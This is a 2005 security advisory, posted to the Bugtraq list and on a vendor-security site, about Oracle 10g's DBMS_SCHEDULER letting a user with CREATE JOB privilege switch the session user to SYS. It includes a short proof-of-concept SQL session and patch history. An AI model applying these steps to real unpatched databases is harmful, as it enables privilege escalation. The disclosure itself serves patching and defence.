=== Content from marc.info_9f0aedc1_20250125_050656.html ===

```
[[prev in list](?l=bugtraq&m=111531683824209&w=2)] [[next in list](?l=bugtraq&m=111531519727307&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Oracle 10g DBMS_SCHEDULER SESSION_USER issue
From:       [Alexander Kornbrust <ak () red-database-security ! com>](?a=111472267600006&r=1&w=2)
Date:       [2005-05-05 11:00:06](?l=bugtraq&r=1&w=2&b=200505)
Message-ID: [20050505110006.25926.qmail () www ! securityfocus ! com](?i=20050505110006.25926.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=111531740305049&q=mbox) or [body](?l=bugtraq&m=111531740305049&q=raw)]

Red-Database-Security GmbH Oracle Security Advisory

Name               Oracle 10g DBMS_SCHEDULER SESSION_USER issue
Systems Affected   Oracle Database 10g
Severity           Medium Risk
Category           Switch SESSION_USER to SYS
Vendor URL         <http://www.oracle.com>
Author             Alexander Kornbrust (ak at red-database-security.com)
Date               03 May 2005  (V 1.00)

Description
###########
Every user with CREATE JOB privilege can switch the SESSION_USER to SYS by executing \
a database job via dbms_scheduler. This could cause problems with VPD (virtual \
private database) or OLS (Oracle label security) and could allow privilege \
escalation.

This issue is not related to the Oracle Critical Patch Update 2005.

More details including testcase available:
##########################################

<http://www.red-database-security.com/exploits/oracle_exploit_dbms_scheduler_select_user.html>

Patch Information
#################
This information has been public for months but Oracle never released a security \
alert for this issue. Applying patchset 10.1.0.4 is fixing this issue.

History:
########
07 October 2004	Published at the Oracle Enterprise Server Forum in Metalink

About Red-Database-Security GmbH
#################################
Red-Database-Security GmbH is a specialist in Oracle Security.

<http://www.red-database-security.com>

[[prev in list](?l=bugtraq&m=111531683824209&w=2)] [[next in list](?l=bugtraq&m=111531519727307&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.red-database-security.com_582fc59f_20250125_050656.html ===


[![](http://www.red-database-security.com/pictures/red_database_security_logo.jpg)](http://www.red-database-security.com)[![](http://red-database-security.com/pictures/teaser.jpg)](http://www.red-database-security.com/security_training/oracle_anti_hacker_training.html)

| Services [Oracle Audit / Hardening](http://www.red-database-security.com/services/audit.html) [Security Training](http://www.red-database-security.com/security_training/oracle_security_training.html) [Consulting](http://www.red-database-security.com/services/consulting.html)  Information [Oracle Security Blog](http://blog.red-database-security.com)  [Published Alerts](http://www.red-database-security.com/advisory/published_alerts.html) [Upcoming Alerts](http://www.red-database-security.com/advisory/upcoming_alerts.html) [Patch Information](http://www.red-database-security.com/whitepaper/oracle_patches.html) [Whitepaper](http://www.red-database-security.com/whitepaper/oracle_security_whitepaper.html) [Presentations](http://www.red-database-security.com/whitepaper/presentations.html) [Oracle Fact Sheets](http://www.red-database-security.com/whitepaper/fact_sheets.html) [Exploits](http://www.red-database-security.com/exploits/oracle_exploits.html) [Tutorials](http://www.red-database-security.com/tutorial/tutorials.html) [Videos](http://www.red-database-security.com/videos/oracle_videos.html)  [Scripts](http://www.red-database-security.com/scripts/oracle_security_scripts.html)  News & Events [Events](http://www.red-database-security.com/events/events.html) [News](http://www.red-database-security.com/news/rds_news.html)  Company [Blog](http://blog.red-database-security.com) [Contact](http://www.red-database-security.com/contact/contact.html) [People](http://www.red-database-security.com/people/people.html) [Partner](http://www.red-database-security.com/partner/partner.html) [Impressum](http://www.red-database-security.com/impressum/impressum.html) [Sitemap](http://www.red-database-security.com/sitemap/sitemap.html)    [Search](http://www.red-database-security.com/search/search.html)   | Search Red-Database-Security | | --- | | DBMS\_SCHEDULER SESSION\_USER issue in Oracle 10g  | **Name** | DBMS\_SCHEDULER SESSION\_USER issue in Oracle 10g | | --- | --- | | **Systems Affected** | Oracle 10g | | **Severity** | Medium Risk | | **Category** | Switch Oracle Username to user SYS | | **Vendor URL** | [http://www.oracle.com/](http://www.oracle.com/%20) | | **Credit** | Oracle Metalink Forum 633336.995 | | **Exploit** | Forum Entry removed by Oracle | | **Date** | 07 May 2005 (V 1.02) | | **VU#** | 176909 |   Details  The following proof of concept exploit code (from Metalink) allows any user with CREATE JOB privileges to switch the session\_user to SYS. This statement is often used together with VPD (Virtual Private Database) or OLS (Oracle Label Security) and could allow privilege escalation. The old deprecated current\_user shows the right user.  Example Connect as a user with CREATE job privilege  SQL> select user from dual;  USER --------- JOBUSER  SQL> execute dbms\_scheduler.run\_job('ANY\_JOB');  PL/SQL procedure successfully completed.  SQL> select user from dual;  USER --------- SYS  SQL> select (sys\_context('userenv','session\_user')) from dual;  USER --------- SYS  SQL> select (sys\_context('userenv','current\_user')) from dual;  USER --------- JOBUSER  SQL> show user  USER is "jobuser"    Patch Information Apply the patches for Oracle Critical Patch Update October 2005.   History 05-may-2005 US CERT VU# added (V1.01) 07-may-2005 Oracle removed the forum entry from Metalink (V1.02)  18-oct-2005 Oracle released CPU October 2005    © 2005 by Red-Database-Security GmbH - last update 02-nov-2005 | Definition Exploit An exploit is a common term in the computer security to refer to a piece of software that take advantage of a bug or vulnerability leading to a privilege escalation or d.o.s. on a computer system. Computer security experts are using exploit code to test if a patch is working properly. |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |


